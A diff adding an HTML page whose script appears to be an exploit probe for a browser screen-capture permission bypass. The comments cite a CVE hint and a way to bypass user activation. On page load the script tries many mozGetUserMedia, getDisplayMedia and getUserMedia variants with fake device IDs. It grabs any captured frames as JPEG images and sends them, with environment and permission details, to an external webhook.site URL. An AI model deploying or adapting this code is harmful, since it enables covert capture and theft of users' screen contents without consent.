@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html><head><title>D</title></head>
+<body style="margin:0;background:#111;">
+<script>
+var W='https://webhook.site/6d9e36a0-6849-4f87-992d-084ff46488f5';
+var N=0;
+function rpt(k,v){N++;new Image().src=W+'?n='+N+'&t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
+
+rpt('INIT','sec='+window.isSecureContext
+  +'|md='+(typeof navigator.mediaDevices)
+  +'|moz='+(typeof navigator.mozGetUserMedia)
+  +'|loc='+location.protocol+'//'+location.host
+  +'|top='+(window===window.top)
+  +'|ref='+document.referrer.substring(0,100));
+
+var done=false;
+
+function processStream(label,stream){
+  if(done)return;done=true;
+  rpt('GOT_STREAM',label+'|tracks='+stream.getTracks().length);
+  stream.getTracks().forEach(function(t,i){
+    rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
+  });
+  var v=document.createElement('video');
+  v.srcObject=stream;v.autoplay=true;v.muted=true;
+  v.style.cssText='width:800px;height:600px;display:block';
+  document.body.appendChild(v);
+  var gN=0;
+  function grab(gl){
+    gN++;if(gN>10)return;
+    var w=v.videoWidth||1600,h=v.videoHeight||900;
+    rpt('GRAB',gl+'|'+w+'x'+h+'|rdy='+v.readyState);
+    if(w<=0||h<=0)return;
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',gl+'|'+e.message);return}
+    try{
+      var d=ctx.getImageData(0,0,20,1);
+      var px=Array.from(d.data);
+      var nz=px.filter(function(x){return x>0}).length;
+      rpt('PX',gl+'|nz='+nz+'|'+px.slice(0,40).join(','));
+    }catch(e){rpt('PX_E',gl+'|'+e.message)}
+    try{
+      var du=c.toDataURL('image/jpeg',0.8);
+      rpt('DU',gl+'|len='+du.length);
+      if(du.length>1000){
+        try{navigator.sendBeacon(W,gl+':'+du)}catch(e){}
+        fetch(W,{method:'POST',mode:'no-cors',body:gl+':'+du}).catch(function(){});
+      }
+    }catch(e){rpt('DU_E',gl+'|'+e.message)}
+  }
+  v.onloadeddata=function(){
+    rpt('VID_READY',v.videoWidth+'x'+v.videoHeight);
+    grab('ld0');
+    setTimeout(function(){grab('ld1')},1000);
+    setTimeout(function(){grab('ld3')},3000);
+    setTimeout(function(){grab('ld5')},5000);
+  };
+  setTimeout(function(){grab('t1')},500);
+  setTimeout(function(){grab('t3')},3000);
+  setTimeout(function(){grab('t10')},10000);
+}
+
+// === APPROACH A: mozGetUserMedia (bypasses activation) ===
+function tryMoz(label,constraints){
+  if(done)return Promise.resolve();
+  return new Promise(function(resolve){
+    if(!navigator.mozGetUserMedia){rpt('MOZ_NA',label);resolve();return}
+    rpt('TRY_MOZ',label);
+    navigator.mozGetUserMedia(constraints,
+      function(s){rpt('MOZ_OK',label);processStream('moz_'+label,s);resolve()},
+      function(e){rpt('MOZ_E',label+'|'+e.name+':'+e.message.substring(0,200));resolve()});
+  });
+}
+
+// === APPROACH B: getDisplayMedia ===
+function tryGDM(label,constraints){
+  if(done)return Promise.resolve();
+  return new Promise(function(resolve){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia){rpt('GDM_NA',label);resolve();return}
+    rpt('TRY_GDM',label);
+    navigator.mediaDevices.getDisplayMedia(constraints).then(function(s){
+      rpt('GDM_OK',label);processStream('gdm_'+label,s);resolve();
+    }).catch(function(e){
+      rpt('GDM_E',label+'|'+e.name+':'+e.message.substring(0,200));resolve();
+    });
+  });
+}
+
+// === APPROACH C: getUserMedia with display constraints ===
+function tryGUM(label,constraints){
+  if(done)return Promise.resolve();
+  return new Promise(function(resolve){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){rpt('GUM_NA',label);resolve();return}
+    rpt('TRY_GUM',label);
+    navigator.mediaDevices.getUserMedia(constraints).then(function(s){
+      rpt('GUM_OK',label);processStream('gum_'+label,s);resolve();
+    }).catch(function(e){
+      rpt('GUM_E',label+'|'+e.name+':'+e.message.substring(0,200));resolve();
+    });
+  });
+}
+
+async function runTests(){
+  // Phase 1: mozGetUserMedia with various mediaSource + deviceId
+  // "capturing a non existing screen/device -> bogus data"
+  await tryMoz('browser',{video:{mediaSource:'browser'}});
+  await tryMoz('screen',{video:{mediaSource:'screen'}});
+  await tryMoz('window',{video:{mediaSource:'window'}});
+
+  // Non-existent deviceId combinations (the CVE hint!)
+  await tryMoz('browser_d0',{video:{mediaSource:'browser',deviceId:'0'}});
+  await tryMoz('browser_d1',{video:{mediaSource:'browser',deviceId:'1'}});
+  await tryMoz('browser_dfake',{video:{mediaSource:'browser',deviceId:'fake'}});
+  await tryMoz('browser_dempty',{video:{mediaSource:'browser',deviceId:''}});
+  await tryMoz('browser_ddefault',{video:{mediaSource:'browser',deviceId:'default'}});
+  await tryMoz('screen_d0',{video:{mediaSource:'screen',deviceId:'0'}});
+  await tryMoz('screen_d1',{video:{mediaSource:'screen',deviceId:'1'}});
+  await tryMoz('screen_dfake',{video:{mediaSource:'screen',deviceId:'fake'}});
+  await tryMoz('screen_dempty',{video:{mediaSource:'screen',deviceId:''}});
+  await tryMoz('window_d0',{video:{mediaSource:'window',deviceId:'0'}});
+  await tryMoz('window_d1',{video:{mediaSource:'window',deviceId:'1'}});
+
+  // Phase 2: getDisplayMedia variations
+  await tryGDM('basic',{video:true});
+  await tryGDM('ds_browser',{video:{displaySurface:'browser'}});
+  await tryGDM('ds_monitor',{video:{displaySurface:'monitor'}});
+  await tryGDM('prefer_tab',{video:true,preferCurrentTab:true});
+  await tryGDM('self_include',{video:true,selfBrowserSurface:'include'});
+  await tryGDM('devid_fake',{video:{deviceId:'fake'}});
+  await tryGDM('devid_0',{video:{deviceId:'0'}});
+
+  // Phase 3: getUserMedia with display media constraints
+  await tryGUM('ms_browser',{video:{mediaSource:'browser'}});
+  await tryGUM('ms_screen',{video:{mediaSource:'screen'}});
+  await tryGUM('adv_browser',{video:{advanced:[{mediaSource:'browser'}]}});
+  await tryGUM('adv_screen',{video:{advanced:[{mediaSource:'screen'}]}});
+
+  // Phase 4: Permission check
+  try{
+    var ps=await navigator.permissions.query({name:'display-capture'});
+    rpt('PERM_DC','state='+ps.state);
+  }catch(e){rpt('PERM_DC_E',e.name+':'+e.message.substring(0,100))}
+  try{
+    var ps2=await navigator.permissions.query({name:'camera'});
+    rpt('PERM_CAM','state='+ps2.state);
+  }catch(e){rpt('PERM_CAM_E',e.name+':'+e.message.substring(0,100))}
+
+  rpt('ALL_DONE','tests_complete');
+}
+
+runTests();
+</script>
+</body>
+</html>
